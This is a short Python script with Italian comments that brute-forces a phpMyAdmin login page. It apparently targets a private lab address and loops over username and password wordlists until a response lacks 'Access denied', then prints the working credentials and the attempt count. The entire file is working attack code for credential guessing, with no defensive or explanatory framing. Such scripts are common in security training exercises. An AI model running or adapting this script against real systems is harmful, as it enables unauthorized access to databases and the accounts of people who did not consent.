import requests

username_file = 'usernames.txt'
password_file = 'passwords.txt'
numerotentativi= 0

with open(username_file, 'r') as usernames:
	with open(password_file, 'r') as passwords:
		# Leggi tutti gli usernames e le passwords in due liste separate
		username_list = usernames.readlines()
		password_list = passwords.readlines()
		
		for username in username_list :
			for password in password_list:
				username = username.strip()
				password = password.strip()
				
				url = 'http://192.168.50.101/phpMyAdmin/' 
				response = requests.post(url, data = {'pma_username': username, 'pma_password': password, 'input_go': "Go"})
				
				numerotentativi=numerotentativi+1
				
				if response.status_code == 200:
					if 'Access denied' in response.text:  
						print('Accesso errato -->',username,'-',password)
					else:
						print('Accesso riuscito -->',username,'-',password)
						print('Accesso effettuato in ',numerotentativi,' tentativi')
						exit()
				else:
					print('Errore nella richiesta:', response.status_code)










